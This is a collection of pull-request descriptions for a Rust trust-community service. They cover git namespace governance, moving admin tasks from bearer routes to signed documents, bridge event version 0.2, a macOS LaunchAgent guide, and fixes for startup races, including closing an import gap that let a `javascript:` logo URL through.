`GET /v1/git-ns/{view,namespaces,repos,rights,rights/issued-by-departed,drift,jobs,projection}` with utoipa; `vta_sdk::openapi` gains `GitNsView01*` wrappers. `openapi.json` and `wire.ts` regenerated. Mutations are signed tasks only (proof REQUIRED).

### Follow-ups for the admin console
- **Console keys** (#1684/#1692): a console signing key acts as the admin DID it stands for on member-facing `git-ns/*` tasks (same rule as `admin_signer`; never for `bridge/*`).
- **Bridge status via `ext`** (`org.openvtc.git-ns`): installation id, app name/slug, manifest registration, missing/pending permissions, org rulesets, required workflow, bridge-posted check; per repo the guard in force and last check; plus per-step outcomes. Surfaced on the namespace/repo rows with effective `role_drift` and `cascade_on_departure`.
- `GET /v1/git-ns/accounts`, `GET /v1/git-ns/activity` (namespace-admin scoped). Only `view` carries a Trust-Task URL; the other reads are console projections no spec defines.
- **Bind confirmation**: not added. `git-ns/namespace/bind/0.1` step 4: "When the bridge reports `bindCompleted` for that job, the VTC records the owner's forge id and kind, sets the namespace to `bound`, and records `git.ns.admin` …" — the spec binds on `bindCompleted`, so the design's §4.1 step-4 confirmation is not implemented.

### Clients
`vtc-client::git_ns` (signed task helpers + admin reads); `cnm git namespace {bind,unbind,list}`, `cnm git repos`, `cnm git create|transfer|archive|adopt`, `cnm git grant|revoke`, `cnm git view [--admin]`, with fix-suggesting errors.

### Other
`vti-common` audit: `AuditEvent::GitNsOperation` (enum is `#[non_exhaustive]`: additive). Docs: `docs/03-vtc/git-namespaces.md`, CLAUDE.md flow entry.

## VTI spec impact (drafted, not applied)
See the report: VTI-VTC-020 / VTI-ACL-001 (git rights authorise `git-ns/*` outside the ACL model), VTI-VTC-021 (no step-up on the signed path — fallback above), VTI-REG-001 (git rights publish member DIDs against repositories).

* feat(vtc): git namespaces — forge governance, registry projection and bridge messaging

A VTC now governs repositories on the forges it has bound and publishes who may
do what there to its Trust Registry: the `git-ns/*` Trust Task family
(trustoverip/dtgwg-trust-tasks-tf `specs/git-ns/**`, and #623 — an
`ns.admin`'s implied `git.commit.sign` is published on the namespace).

vtc-service `git_ns`:
- store (`git_ns`, `git_ns_jobs`, `git_ns_projection`); rights keyed by an
  internal repository id so a forge rename moves them and a new repository at
  the old name inherits nothing; per-scope rights sets so a transfer is one
  write; every mutation under one process-wide lock (last-owner and last-admin
  are set invariants).
- the fixed rules of `git-ns/right/grant` in code: whole-segment containment,
  level check, grant-authority table (`repo.create` not re-delegable), last
  owner, last admin, members-only floor for namespace rights.
- `PolicyPurpose::GitNamespace` (`gitNamespace`, package
  `vtc.git_namespace`), default `git_ns.rego`: members only, no external
  signers, except the namespace bridge's own service grant. Evaluated after the
  fixed rules and able only to refuse (`git-ns:policyDenied`); carries the
  community's `settings` (maintainer grants, `cascade_on_departure`,
  `role_drift`).
- handlers for bind, unbind, repo create/adopt/transfer/archive, right
  grant/revoke, view, account link/link-status, bridge result/event on the
  document dispatcher, proof-required per their specifications; every declared
  error code is emitted.
- consent classes (design §6): no member step-up exists on a signed document,
  so `[git_ns] elevated_requires_admin` (default true) admits elevated and
  destructive actions only from a community administrator (VTI-VTC-021 gap,
  narrowing only).
- an audit-tailed projector writing `registry/record/{put,delete}` (new
  `TrustRegistryClient::{put,delete}_trust_record`): one authorization record
  per live right, the implied `git.commit.sign` of every own/maintain/ns.admin,
  `context` carrying framework (VTI-REG-002), grantedBy, activeFrom/activeTo;
  a reason is never published. Idempotent against a mirror, withdraws before
  it publishes, and holds a renamed repository's new tuples until the old are
  gone.
- lifecycle: departure revokes every git right (VTI-MEM-033), orphans
  sole-owner repositories, keeps grants a departed member issued for review
  (or revokes them under `cascade_on_departure`), deletes forge links; expiry
  and stale-binding sweeps.
- bridge messaging: `git-ns/bridge/job` signed and sent over TSP or DIDComm by
  service type, acknowledged through `PendingReplies`; durable queue (role
  projection retries forever), results and events accepted only from the
  namespace's recorded bridge. A bound bridge namespace grants its bridge
  `git.commit.sign` on the namespace as a service grant (Dependabot re-signing).
- read-only admin REST under `/v1/git-ns/*`, OpenAPI via new
  `vta_sdk::openapi::GitNsView01*` wrappers; `openapi.json` and `wire.ts`
  regenerated.

vti-common: `AuditEvent::GitNsOperation` (the enum is `#[non_exhaustive]`).
vtc-client: `git_ns` — signed task helpers and admin reads.
cnm-cli: `cnm git namespace {bind,unbind,list}`, `repos`, `grant`, `revoke`,
`adopt`, `view`.

The v0.1 `[hooks.git-trust] grant_on_role` relay is unchanged and listed as
role-derived rights. Docs: `docs/03-vtc/git-namespaces.md`.

Signed-off-by: Glenn Gore <glenn.g@affinidi.com>

* feat(vtc): git namespaces — console keys, bridge status, accounts, activity, more cnm verbs

- A console signing key (#1684, #1692) acts as the admin DID it stands for on
  every member-facing `git-ns/*` task, resolved at execution time with the
  same rule as `admin_signer`: only a signer with no ACL row of its own falls
  through to a live delegation, and a delegation confers no role or right of
  its own (VTI-OPS-050). The bridge's tasks never delegate.
- The bridge reports what the specification's payloads do not carry in their
  `ext` member under `org.openvtc.git-ns`: app installation, name and slug,
  manifest registration, missing and pending permissions, org-ruleset and
  required-workflow availability, bridge-posted-check readiness; per
  repository, the guard in force and the last verify-trust check. Kept for
  display, changing no decision; step outcomes of the last create, bootstrap
  or inspect are kept too. The namespace and repository admin rows carry them,
  with the effective `role_drift` and `cascade_on_departure`.
- `GET /v1/git-ns/accounts` (linked forge accounts) and
  `GET /v1/git-ns/activity` (rights changes, drift and jobs in the namespaces
  the caller administers, read from the git-ns audit rows and the job queue).
  Only `view` carries a Trust-Task URL: the other admin reads are console
  projections no specification defines.
- `cnm git create`, `transfer`, `archive`.

Signed-off-by: Glenn Gore <glenn.g@affinidi.com>

* fix(vtc-service): address git namespaces review findings

Review of #1694 at f9b4e5ab, findings 1-9, each with a regression test.

1. Bridge events are confined to the event's namespace: every lookup is
   scoped to ns.id, the name fallback applies only when the recorded forge
   id is unknown or matches, every resource an event names must be a
   repository of the namespace, and a transfer out of it detaches rather
   than moving rights. A repository created at a governed name under a new
   forge id displaces (detaches) the old one.
2. The published registry context no longer carries grantedBy.
3. One writer per registry key: v0.1 role-derived grants inside a bound
   namespace are a projection source (origin roleDerived); the hook relay
   drops jobs for those resources and warns at boot; a key is withdrawn
   only when no source wants it; a periodic verify pass lists the registry
   by authority, rebuilds the mirror and reconciles (also covers restore).
4. view, rights, rights/issued-by-departed, projection and accounts need a
   community-wide administrator; activity keeps its namespace-admin rule.
5. Adopting one's own reservation is normal class; documented, with a cnm
   hint, what the default elevated_requires_admin means for owners.
6. accountLinked must be on the attempt's and the namespace's forge and
   arrive before expiry; member edits go through members::storage's
   locked read-modify-write (also used by the member routes and VMC).
7. Rows with an expiry do not count toward last-admin / last-owner; the
   headless recovery gap is documented.
8. Departure-sweep audit rows name the VTC as actor and carry no
   plaintext departed DID.
9. Create/adopt wait for an old name's withdrawal; installationRemoved is
   cleared by a later installation report; the dispatch write-back holds
   the store lock and never overwrites a racing result; policy facts need
   a RulesPassed token only the fixed rules issue; members do not see an
   unbound namespace's detached repos; cnm states publication before the
   bind is sent; the default policy admits resignation by anyone.

Signed-off-by: Glenn Gore <glenn.g@affinidi.com>

* fix(vtc-service): one row per repository name, locked member writes

Second review of #1694 (R1-R4 and minors), and the unbind gap.

R1. A name is recorded by at most one repository that is not detached.
repoCreatedUnmanaged takes up a detached row at the name when it is the
same repository and folds away any other (in any namespace, as a rename
already did), detaches and folds a governed row under another forge id,
moves a row found by forge id to the reported name, and records nothing
over a pendingCreate reservation. repo_at prefers the non-detached row,
then the newest, never storage order. Adopting a detached row clears its
forge id so the inspection names what is there now.

R2. PATCH /members/{did} refuses writes to extensions.forges and keeps
the member's linked accounts when extensions is replaced.

R3. Every member-row writer (admit, re-mint, depart incl. purge, renew,
rotate, personhood assert/revoke, invitation flag) goes through
members::storage::edit_member or holds the edit lock; lock order is the
git_ns store lock before the edit lock.

R4. A transfer leaves the recipient ownership as durable as the
caller's: a permanent owner replaces a recipient's expiring record with
a permanent one; an expiring owner hands over its expiry.

Minors: /git-ns/drift needs a community administrator; the hook overlap
warning also fires when a namespace is bound at run time; a verify pass
skipped for too many records logs at warn; the role mapping is read once
per projector pass; service_grant_admitted checks the namespace is bound
and the subject is the bridge it records.

Unbind: role-derived grants go back to the hook relay at once. The
unbind queues a relay grant for each mapped member and resource it
contained, and the projector hands those keys back (drops them from its
mirror) instead of withdrawing them.

Docs: the transfer rule (detach; rights never move) departs from
git-ns/bridge/event/0.1; bridge/event 0.2 (trust-tasks #627, pending)
adopts it.

Signed-off-by: Glenn Gore <glenn.g@affinidi.com>

* fix(vtc-service): never two live rows or forge ids per git repository

Verification of b0e67823 found R1 incomplete.

- repoCreatedUnmanaged decides before it writes: a pendingCreate
  reservation at the name refuses the event whether or not the forge id
  is known elsewhere; a live row at the name with no known forge id,
  while the repository is already recorded under its forge id, is a
  conflict (warned, nothing applied), as the rename handler does; a
  forge id another live row holds is never given to a second one.
- An inspection result never records a forge id another live repository
  holds; it leaves the row without one and says why.
- A rename or transfer matches a repository by forge id only: a row whose
  forge id is not yet known is never moved on a name, and the next
  inspection reconciles it.
- Snapshot::lookup_repo makes two live rows at one name an error: every
  write path (grant, revoke, adopt, create, transfer, archive) refuses it
  as unavailable instead of picking one; reads log it and see nothing.

The verifier's probes are kept as regression tests (git_ns::tests::
r1_probes).

Signed-off-by: Glenn Gore <glenn.g@affinidi.com>

* fix(vtc-service): a detached git repository holds no addressable forge id

Recheck of c6df22af: a repository detached by a deletion kept its forge
id, so once another repository was recorded under the same id, a rename
could move the detached row instead of the live one and a
repoCreatedUnmanaged could leave two live rows with one forge id.

- Snapshot::repo_by_forge_id and the name fallback of an event lookup
  consider live rows only; a detached row is history, not addressable.
- Detaching (deletion, transfer, name reuse) clears the row's forge id;
  the audit rows keep the history. Every forge-id path (event lookup,
  rename, transfer, create, inspection uniqueness) now agrees.

Regression tests: the verifier's recheck probes (r1_probes::rc_*), with
rc_detached_and_live_same_forge_id_loop at 30 iterations, and the
ambiguous-name probe asserting that a bridge report resolves it to one
live row and the rows it displaced lose their rights.

Signed-off-by: Glenn Gore <glenn.g@affinidi.com>

title: feat(vtc-client)!: the admin verbs with a signed binding are sent as signed documents (#1641)
body:
#1641 named two blockers to retiring the VTC's bearer routes, and this closes
the second for every verb `vtc-client` reaches that has a signed binding: a
join decision (`approve_join` / `reject_join`), `update_member_extensions`,
`remove_member`, `member_credentials` and `export_backup`.

A client built with `VtcClient::connect` already holds the operator's own
`did:key` — it authenticated with it. The VTC authorizes a signed admin
document from the signer's own ACL entry (`admin_signer`), so the client signs
as the operator: no console-style delegation is involved. Those verbs now go
**only** as documents, posted to `POST {base}/trust-tasks`, and over a DIDComm
or TSP session they ride the session — which lifts `NoRestTransport` for them.

BREAKING: a key-holding client does not fall back to the bearer route, so
against a VTC that predates a verb's signed binding (#1681, #1689, #1708) that
verb now fails with the VTC's `unsupportedType` refusal instead of working
over bearer. A fallback would keep the bearer routes load-bearing for exactly
the clients that can sign. A client built with `with_token` holds no key and
keeps using the bearer routes unchanged. `connect` now also refuses a
`client_did` that is not a `did:key` up front; authentication already could not
sign as anything else.

- One document path: `admin_document` chooses the session, then the key, then
  (keyless) the bearer route; `post_document` is shared with `submit_join_as`,
  which lost its own copy.
- Every document reply is read under a size cap — 64 MiB for a backup (the
  bound the bearer route already used), 8 MiB for anything else.
- A refusal is classified like the bearer route's: a declared code plus the
  `not_found` marker (#1219) is `VtcError::NotFound`, since the VTC answers a
  declared refusal with 422 rather than 404.

`signed_admin_verbs_do_not_ride_the_bearer_session` ends the client's session
after connecting and shows a bearer-only verb refused while `update`,
`credentials` and `admin-remove` still work.

## Decision taken with the maintainer

"Sign only, no fallback" for a key-holding client was chosen over signing with
a bearer fallback for older VTCs. One reading made on top of it, flagged for
review: a **keyless** `with_token` client keeps using the bearer routes rather
than erroring, since it has nothing to sign with. If those verbs should refuse
on a keyless client instead, that is a small follow-up.

## Tests

- `vtc-service/tests/vtc_client_live.rs`: the new signed-path test above; the
  existing decide / credentials live tests now run over the signed path and
  still hold (the typed `NotFound` for an unknown member included).
- `vtc-client` unit tests: `document_error` types a declared refusal with the
  absence marker as `NotFound` regardless of HTTP status, and needs both halves.

## Verified locally

- `cargo test -p vtc-service -p vtc-client --no-fail-fast`: all pass
- `cargo clippy --workspace --all-targets -- -D warnings` and
  `cargo clippy -p vtc-client --all-targets --all-features -- -D warnings`: clean
- `cargo check -p vtc-client` under default, `--all-features` and
  `--no-default-features`: clean
- `cargo fmt --all -- --check`: clean

## Also noticed, not changed here

`vta_sdk::trust_task_sign::HolderKey` derives `Debug` over its private key.
`VtcClient`'s own `Debug` never prints the key it now holds, but anything that
formats a `HolderKey` directly would log the secret — worth a separate fix in
vta-sdk.

title: Narrow the bearer-token entry in the divergence register to the tasks it still covers
body:
The third of the entries #35 recorded in Appendix F.2 stays open, but four of
its reported numbers no longer describe the node. The row is updated to what
the node does now; the history is here rather than in the row, for the reason
F.6 gives.

- 47 → 45 tasks, 30 → 28 community tasks. `vtc/config/{export, import}` are
  no longer served on the bearer binding at all
  (OpenVTC/verifiable-trust-infrastructure#1702). Nothing called those routes,
  so the signed binding replaced them rather than joining them, and the entry
  is closed for those two tasks.
- Six → five tasks that do not declare the time of issue REQUIRED, since
  `vtc/config/export` was one of the six.
- Three → eleven community tasks also served by the document dispatcher.
  #1681, #1689 and #1705 bound `vtc/members/{credentials, update,
  admin-remove, purge}`, `vtc/join-requests/decide`,
  `vtc/community/profile/update` and `vtc/endorsement-types/{register,
  delete}` there, with authority read from the signer's access-control entry
  when the document is executed. Their bearer routes remain as transitional
  paths, so the entry still stands for them: the divergence closes when the
  bearer route goes, not when the signed binding opens.
- "See the next entry" pointed at the dispatcher-leniency entry, which #38
  moved to F.5. The row now points there.

Checked against the node's merged tree rather than the changes' descriptions:
the dispatched set holds the eleven and the two config tasks, and no route for
`vtc/config/{export, import}` remains mounted.

title: feat(vtc): the backup export is served as a signed document (#1641)
body:
#1641 phase 2, batch 5. `vtc/backup/export/0.1` declares `proof` REQUIRED and
was served only as bearer REST. It is now bound in `DISPATCHED_URIS` /
`dispatch_typed`, reachable over REST, DIDComm and TSP. The bearer route took
`SuperAdminAuth`, so the signer's ACL entry must be an unrestricted admin
(`require_super_admin`, as `members/purge` asks) — a context-scoped admin is
refused on both doors. The bearer route stays because `vtc-client` calls it.

- The route body moved into `export_inner`, which both doors call.
- The reply is the whole encrypted envelope, and the spine records it against
  the document's `id`, so a redelivery is answered with the same envelope
  rather than a second export under a fresh salt and nonce. That keeps a
  second, password-encrypted copy in `accepted_ids` for the acceptance window;
  the keyspace is excluded from backup, so it cannot end up inside a later
  export.
- The password rides in a signed, unencrypted document — no worse than the
  bearer body: REST is TLS, DIDComm and TSP encrypt end to end, and the spine
  records a document's id and digest, never its payload.

## Why `backup/import` does not move

Its request carries the whole envelope, which a 64 KiB document cannot hold,
and raising the cap on the unauthenticated chain is not the answer. The design
note (§6b, batch 5) now sets out the fix — a chunked transfer session
(`begin` / `chunk` × n / `commit`, each document signed and small, the digest
checked at commit, super-admin checked at both ends) — to be proposed in
dtgwg-trust-tasks-tf first, since the dispatcher cannot bind an unpublished
family. `export` has the mirror problem on the messaging transports.

## Tests

`trust_tasks::backup_export_tests` (6): signed super-admin export (reply
conforms to `#response`), context-scoped admin and member refused, unsigned
refused, `passwordTooShort` declared, and a redelivered document answered with
the same envelope.

## Verified locally

- `cargo test -p vtc-service -p vtc-client --no-fail-fast`: all pass (batch-5 tests re-run after rebasing onto #1706)
- `cargo clippy -p vtc-service --all-targets -- -D warnings` and `cargo fmt --all -- --check`: clean
- The backup routes are mounted outside the OpenAPI router, so `openapi.json` is unchanged.

## Related

- trustoverip/dtgwg-vti-spec#39 narrows the Appendix F.2 entry to the tasks it still covers.
- Next: `vtc-client` signs the admin verbs that have a signed door.

VTI-OPS-020, VTI-OPS-025, VTI-OPS-026, VTI-OPS-027.

title: fix(pnm): log output no longer draws over `pnm messaging console`
body:
## Problem

While the mediator was unreachable, `pnm messaging console` was unreadable. pnm's `tracing` subscriber writes to stderr, which is the terminal the console draws on. The SDK logs a DNS or auth error every few seconds, and each line landed on top of the screen. ratatui only redraws cells it changed itself, so the lines never went away.

## Change

- `main.rs`: the subscriber writes through a process-wide `LogCapture` (`LOGS`) instead of `std::io::stderr`. That prints to stderr exactly as before, except while a console holds the capture.
- `messaging console`: hands the capture to `App::with_logs`. While the console runs, log lines are kept, and the console shows them in its log view (`l`), with a count of unread errors and warnings in the header. When you quit, logging goes back to stderr.
- `affinidi-messaging-mediator-tui` requirement raised to `0.2.1`, the first version with `LogCapture`.

No other output can reach the terminal while the console is open: every `println!`/`eprintln!` in `commands/messaging.rs` runs before `ratatui::init`.

## Testing

- Against the published `affinidi-messaging-mediator-tui` 0.2.1 (affinidi/affinidi-tdk-rs#891): `cargo clippy -p pnm-cli --all-targets -D warnings` is clean and `cargo test -p pnm-cli` passes (98 tests). The lockfile change is only tui 0.2.0 → 0.2.1, and there is still one `affinidi-messaging-sdk`.
- The console behaviour itself is covered in the TDK PR by `tests/render.rs::logs_stay_off_the_screen_and_the_monitor_scrolls_back`.

title: fix(vtc): a config import onto a VTC with no profile meets the profile edit caps
body: Fixes the gap #1702 recorded in its design-note entry for #1641 batch 3. ## The gap `vtc/config/import/0.1` applied an imported community profile through `CommunityProfileUpdate::apply` when a profile was already stored — and stored it **verbatim** when none was. The verbatim path skipped every cap an edit must meet: - the text-length bounds (`name`, `description`, `contactEmail`, `logoUrl`); - the 16 KiB `extensions` bound; - `http(s)`-only `logoUrl` and `personhood.governanceFrameworkUrl`; - the personhood overclaim refusal. Those caps exist because the profile is served on the unauthenticated `/v1/community/public-profile` endpoint, where `logoUrl` lands in an ``. An import was the one way to publish a `javascript:` logo URL there. **Reach:** only before a VTC has an identity — boot heals a missing profile whenever `vtc_did` is configured (`server.rs`). Narrow, but it is the path an operator takes when migrating a community onto a fresh install. ## The fix Every import builds the same patch. With no stored profile it is applied to `CommunityProfile::new(, "")`, keeping the imported `createdAt`, and the result is stored even when nothing differs from the defaults. The reported changed members now come from `apply` on both paths, which also names `personhood` and `relationshipIdentifierDefault` when an import sets them — the hand-written list left both out. ## Tests - `an_import_with_no_stored_profile_meets_the_edit_caps` — a `javascript:` `logoUrl` is refused as `malformedRequest`, naming the member, and no profile is stored. **Fails on the previous code**, passes on this. - `an_import_with_no_stored_profile_stores_it_and_reports_the_members` — a valid import is stored with its `createdAt` and reports what it set. - `import_round_trip_export_then_import_equivalence` (existing) still holds. ## Verified locally - `cargo test -p vtc-service -p vtc-client --no-fail-fast`: all pass; `admin_config` 43/43 re-run after rebasing onto #1705 - `cargo clippy -p vtc-service --all-targets -- -D warnings` and `cargo fmt --all -- --check`: clean - Only `vtc-service` changed, so the workspace job (which excludes it) is unaffected.

title: feat(vtc): the endorsement-type writes are served as signed documents, and the console signs them (#1641)
body:
Refs #1641 — phase 2, batch 4. Follows #1702 (batch 3) and takes the pair
`docs/05-design-notes/vtc-trust-task-proof-enforcement.md` §6b named next.

## What moved

| task | proof | issuedAt | bearer route |
|---|---|---|---|
| `vtc/endorsement-types/register/0.1` | REQUIRED | REQUIRED | `POST /v1/endorsement-types`, **kept** (transitional) |
| `vtc/endorsement-types/delete/0.1` | REQUIRED | REQUIRED | `DELETE /v1/endorsement-types/{uri}`, **kept** (transitional) |

`list` declares no proof and stays on its bearer route.

Both are bound in `DISPATCHED_URIS` / `dispatch_typed`, reachable over REST,
DIDComm and TSP. Authority is the verified signer's ACL row, read at execution
time (`admin_signer`); the bearer routes applied exactly `AdminAuth`, so a
context-scoped admin is admitted and a member or row-less DID refused.

## Why the bearer routes stay — and the console's first signed calls

Unlike batch 3's config pair, the console calls both writes (the vetting
plugin's statement-types card). So the routes stay, with the transitional note
in their OpenAPI descriptions — and the card now sends each write through
`signedOrBearer`, the **first console call site to do so**: a browser holding a
console key uses the signed door, one without falls back to bearer, and a
*refused* signed call is not retried over bearer.

## Findings

- **`claimSchema` had no bound anywhere.** A schema between ~63 KiB and 1 MB
  registered over bearer but could not fit a 64 KiB signed document, and
  `signedOrBearer` does not fall back on a refusal. Now capped at **32 KiB
  serialised on both doors** (`CLAIM_SCHEMA_MAX_BYTES`), refused as
  `malformedRequest`.
- **`description`'s published `maxLength: 1024` was not enforced** on the bearer
  route (the signed door's schema check already held it). Both enforce it now.
- **The dispatcher panicked on a declared framework code.** `register` refuses a
  `claimSchema` that is not a JSON Schema with `malformedRequest`, carried as
  `TaskError::declared` so the bearer route can put the code in its body.
  `task_error_to_reject` read every declared code as `<slug>:<local>` and would
  have panicked the first time a signed register carried a bad schema. It now
  parses the code as the framework does (`declared_code`).
- **An absent `claimSchema` stays absent.** The generated payload folds absent
  into an empty map; the arm reads the raw payload as `RegisterBody` so the
  stored row records what was sent.

## Tests

- `trust_tasks::endorsement_type_tests` (12): signed register/delete (rows name
  the signer, replies conform to `#response`), unsigned refused, member and
  row-less signer refused, scoped admin admitted, declared `reserved` / `exists`
  / `notFound` / `inUse`, the 32 KiB cap, the not-a-schema refusal (the former
  panic), absent `claimSchema` stays absent.
- `tests/endorsements.rs`: the bearer route enforces both bounds, and accepts a
  1024-character description.
- admin-ui `plugins/vetting/api.signed.test.ts` (3): with a console key the card
  signs register and delete, and a refused signed call does not fall back.

## Verified locally

- `cargo test -p vtc-service -p vtc-client --no-fail-fast`: all pass
- `cargo test --workspace --exclude vtc-service --exclude vtc-client --no-fail-fast`: all pass
- `cargo clippy --workspace --all-targets -- -D warnings` and `cargo fmt --all -- --check`: clean
- admin-ui: vitest 225/225, `tsc -b` and `npm run lint` (`wire:check`) clean; `openapi.json` + `wire.ts` regenerated

## Next

Ten of the 49 now have a signed door; 47 remain. `vtc/admin/invites/{create,revoke}`
waits on the invitations work owned elsewhere; `vtc/backup/{export,import}`
waits on a decision about the 64 KiB cap.

VTI-OPS-020, VTI-OPS-025, VTI-OPS-026, VTI-OPS-027.

title: docs(vta): run a VTA as a macOS LaunchAgent under launchd
body:
Adds a LaunchAgent template (`deploy/macos/org.openvtc.vta.plist`) and an operator page (`docs/02-vta/macos-launchd.md`), linked from `docs/README.md`. Docs and template only — no code.

- **Agent, not daemon.** The default `keyring` backend is the login Keychain, which a pre-login LaunchDaemon cannot read. The page says what to change for a boot-time daemon.
- **Absolute paths.** launchd starts in `/` and `AppConfig::load` falls back to `./config.toml`; a relative `[store] data_dir` (wizard default `data/vta`) resolves against `WorkingDirectory`.
- **Restart policy.** `KeepAlive = { SuccessfulExit = false }`: a SIGTERM stop (exit 0) stays stopped. A startup refusal also exits 1 (`main.rs`), so it is retried too, spaced by `ThrottleInterval` — the page says so rather than implying otherwise.
- Covers upgrades (restart after `cargo install`, Keychain prompt may return), stopping for offline commands (fjall lock), stderr logging, and newsyslog rotation.

`plutil -lint` passes on the template.

title: feat(vtc)!: the config export and import are served only as signed documents (#1641)
body:
Refs #1641 — phase 2, batch 3. Follows #1689 (batch 2) and takes the fallback
`docs/05-design-notes/vtc-trust-task-proof-enforcement.md` §6b named: the
admin-invites pair still waits on the `vtc/invitations/*` work.

## What moved

| task | proof | issuedAt | generated types | bearer route |
|---|---|---|---|---|
| `vtc/config/export/0.1` | REQUIRED | – | payload + `#response` | `POST /v1/admin/config/export`, **removed** |
| `vtc/config/import/0.1` | REQUIRED | REQUIRED | payload + `#response` | `POST /v1/admin/config/import`, **removed** |

Both are bound in `DISPATCHED_URIS` / `dispatch_typed` and reachable over REST,
DIDComm and TSP. Authority is the verified signer's ACL row, read at execution
time (`admin_signer`). The bearer routes applied exactly `AdminAuth`, so the
signed door admits a context-scoped admin and refuses a member, with tests for
both directions.

## Why the bearer routes went now (breaking)

Batches 1 and 2 kept their bearer routes as transitional paths because the admin
console calls them. Nothing calls these two:

- the console has no screen for either (`vtc-console-signing.md` §7);
- `vtc-client`, `cnm` and openvtc do not reach them (searched).

A route with no client has no removal point to wait for, so the divergence is
**closed** for both tasks rather than narrowed — 47 of the 49 remain. Callers
send a signed `vtc/config/{export,import}/0.1` document to
`POST /v1/trust-tasks` instead.

## Findings

- **`ext` was refused on both levels.** `ImportRequest` and
  `ConfigExportDocument` were `deny_unknown_fields` without the `ext` members the
  published schema gives the payload and the document, so a schema-valid import
  carrying either was refused as malformed. Both now accept and ignore it; the
  test fails if the field is removed.
- **Stricter input.** The signed door validates the payload against the schema
  first, so documents the bearer route tolerated but the schema refuses
  (`"communityProfile": null`, `"extensions": null`) are refused now.
- **64 KiB is enough.** The payload is a community profile plus at most five
  small overrides; batch 2 measured the capped profile at ~44 KiB worst case.
- **Recorded, not fixed.** With no profile stored, `apply_profile_import` writes
  the imported profile verbatim, bypassing `CommunityProfileUpdate::apply`'s
  caps (incl. the `http(s)`-only `logoUrl`). Boot heals a missing profile
  whenever `vtc_did` is set, so it is reachable only on a VTC with no identity
  yet. It is identical before and after this change and belongs in an import fix.

## Tests

- `trust_tasks::config_pair_tests` (11): signed export/import, preview writes
  nothing, export → import is a no-op, unsigned refused (`proofRequired`),
  member/row-less signer refused, context-scoped admin admitted, both declared
  error codes, `ext` accepted.
- `tests/admin_config.rs`: the REST export/import suite **ported to signed
  documents through the router**, not dropped — including the audit-actor check,
  which now names the signer. Not ported: the `?confirm=true` query-string test
  (a document has no query string). Added: the bearer routes return 404.
- The #1600 error-code census witnesses were repointed to the renamed tests.

## Verified locally

- `cargo test -p vtc-service -p vtc-client --no-fail-fast`: all pass after the census repoint (`admin_config` 41/41, error-code census 2/2)
- `cargo test --workspace --exclude vtc-service --exclude vtc-client --no-fail-fast`: all pass after the summary fix (`generated_wire_types_census` 3/3)
- `cargo clippy --workspace --all-targets -- -D warnings` and `cargo fmt --all -- --check`: clean
- admin-ui: `openapi.json` + `wire.ts` regenerated, `tsc -b` and `npm run lint` clean

## Follow-ups

- Appendix F.2 in dtgwg-vti-spec should record these two tasks as closed.
- Next batch: `vtc/endorsement-types/{register,delete}` (check `claimSchema` against 64 KiB).

title: feat(vgi-bridge): send git-ns/bridge/event 0.2
body:
Moves the bridge to `git-ns/bridge/event` 0.2 (trust-tasks #627, published in trust-tasks-rs 0.22.5), and keeps 0.1 for a VTC that has not moved yet (VTI #1694 follow-ups).

## What changes

**A transfer detaches.** A managed repository moved to another owner is reported to its old namespace as `repoTransferred`. Its `to` may lie anywhere, because it only records where the repository went. The bridge drops the repository there: the repository record, its place in the managed set (both the store's copy and the GitHub adapter's in-memory copy, which would otherwise write it back), and its Dependabot provenance ledger. Nothing moves into the receiving namespace, even one this bridge serves. There it is reported as `repoCreatedUnmanaged`. If no webhook arrived for the transfer, the next inspection finds it (GitHub answers for the old name with the new home) and reports a transfer, never a `repoRenamed` whose `to` is outside the namespace.

**A reused name detaches the old repository.** A repository created or transferred in at a name the namespace governs under a different forge id is reported as `repoCreatedUnmanaged`, after the old repository is detached. The same applies when an inspection finds a new forge id at a governed name. A rename onto such a name drops the stale record.

**Containment.** `send_event` never sends an event whose `resource`, `from`, `repoRenamed` `to` or drift `resource` lies outside the event's namespace (whole-segment containment). Such an event is logged and dropped. Only a `repoTransferred`'s `to` is exempt.

**Choosing the version.** A new top-level config key, `event_version = "0.1" | "0.2"`, defaults to `"0.2"`. The two versions are wire-identical, so the setting only picks the type URI at send time, and queued events go out under whichever version is configured. An acknowledgement in either version clears the event. The bridge handles events the same way whichever version it sends. The new "Event versions" section in `docs/BRIDGE.md` §7 explains this, including what a 0.1 VTC does with a transfer between namespaces it governs (it moves rights as for a rename, and the bridge does not follow).

**Dependencies.** trust-tasks-rs 0.22.4 → 0.22.5. trust-tasks-proof stays at 0.22.4 because no 0.22.5 is published, and 0.22.4 resolves the same trust-tasks-rs 0.22.5 node.

## Tests

- `tests/events.rs` (new):
  - transfer into another namespace the bridge serves, under 0.2 and under 0.1: the right events in each namespace, and no record, managed-set entry or ledger left behind
  - transfer out of every namespace the bridge serves
  - a transfer only an inspection finds
  - name reuse by create, by transfer-in and by inspection
  - 0.1 typing, and an acknowledgement in either version clears the event
- `mapping.rs` unit test: containment rules for each member, including the exemption for a transfer's `to` and an event with no namespace.
- `config.rs` unit tests: `event_version` parsing and its default.
- The shared test harness now defaults to event 0.2 and acknowledges each event in the version it was sent.

Checks run locally: `cargo fmt --check`, `cargo clippy --workspace --all-targets -D warnings`, `cargo test --workspace`, and `cargo +1.95.0 check --workspace` (MSRV).

title: fix(background): two startup races that surfaced as console errors
body:
Reloading the extension logged two uncaught errors from `background.js`. Both are races between callers that run in the same tick at startup.

## `Duplicate script ID 'vta-wallet-provider'`

On an extension reload, the cold-start call and `onInstalled` both run `syncProviderRegistration()`. It reads what is registered and then writes, so both read "nothing registered", both called `registerContentScripts`, and the second threw. The first had already succeeded, so this one was noise.

**Fix:** calls are serialised on a promise chain in `content-registration.ts`, so each reads the state the previous one left.

## `Could not establish connection. Receiving end does not exist.`

This one lost work. `chrome.offscreen.hasDocument()` turns true as soon as creation *starts*, before the document has registered its `onMessage` listener. `ensureOffscreenDocument` asked it before checking for an in-flight creation, so a concurrent caller returned early. `startInboundListener` then sent `OFFSCREEN_START_INBOUND` into a document with no receiver, and **no inbox session opened** until the connection record next changed. Consent requests arriving in that window went unheard (R7.2).

**Fix:** the in-flight creation is checked before `hasDocument()` and again after it, covering a creation that begins while `hasDocument()` is answering.

## Testing

- `tsc -b` is clean, `npm run build` succeeds, and `npm test` passes across all workspaces.
- **No regression test for either race.** Both need real `chrome.*` timing; `content-registration.test.mts` deliberately covers only the pure match selection.
- **Not yet verified in Chrome** that a reload now logs neither error.

## Pre-merge checklist

- [x] No new reqwest::Client::new() / bare fetch(); all clients have finite timeouts (R1.2) — no network code touched
- [x] No lock held across a network await (R1.3)
